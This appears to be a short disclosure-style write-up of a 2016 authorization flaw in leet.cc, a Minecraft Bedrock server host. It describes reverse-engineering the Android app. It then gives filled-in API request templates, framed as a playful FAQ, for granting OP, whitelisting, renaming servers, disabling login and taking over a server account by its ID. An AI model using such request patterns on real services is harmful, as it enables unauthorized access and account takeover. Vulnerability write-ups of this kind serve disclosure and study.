title: leet.cc account takeover (old bug)
---

The domain name
`leet.cc` was an Minecraft bedrock server hosting provider. (Service seems to no longer exist)  
The following bug allowed getting OP just by knowing someone's server domain.

This bug is from 2016 the same time they had their database breached <https://news.softpedia.com/news/data-for-6-million-minecraft-gamers-stolen-from-leet-cc-servers-507445.shtml> where someone uploaded a PHP shell to their website... This is from memory I may get stuff wrong.

I would hope it's fixed now ðŸ™‚ but then this is `leet.cc`

# Methodology

Reverse engineer the Android app using online apk decompilers and look at the network traffic using <https://www.telerik.com/fiddler> to see if the API did authentication correctly.

Server IDs (Incremental number) are used to identify what server to act on for the API.  
This could be gotten easily by using `https://leet.cc/verifyServerDomain.php?domain=<domain>`  
The user ID which used to be optional was the user's email address or their device ID.

# The exploit

In order to exploit this one would make a request to:

`https://mainapi.leet.cc/actionNew.php?cmd=<command>&userID=<userID>&params[]=<serverID>&params[]=<commandParameter>&versionCode=176&password=something_secret&client=google-free&k=<Base 64 encoded MD5 Hash of part of the URL>&sys=<Base 64 encoded MD5 Hash of part of the URL>`
No one knows why `k` and `sys` were there.

And now the how to exploit FAQ ðŸ™‚

# I want OP!

- `<command>` is `changeOP`
- `<commandParameter>` is your in-game name

# I'm not whitelisted. What should I do?

- `<command>` is `changeWhitelistPlayers`
- `<commandParameter>` is your in-game name

# The server name is missing a duck emoji, no problem!

- `<command>` is `changeServerName`
- `<commandParameter>` is ðŸ¦†

# This old login using `/login <password>` is too annoying.

- Just set `setUserRegistration` to off!

# I wanted an account takeover!

Okay send a request to `https://mainapi.leet.cc/serverLogin.php?serverEmail=<attacker email>&serverPassword=<attacker password>&registerServerID=<serverId>&registerUserID=<userId>`
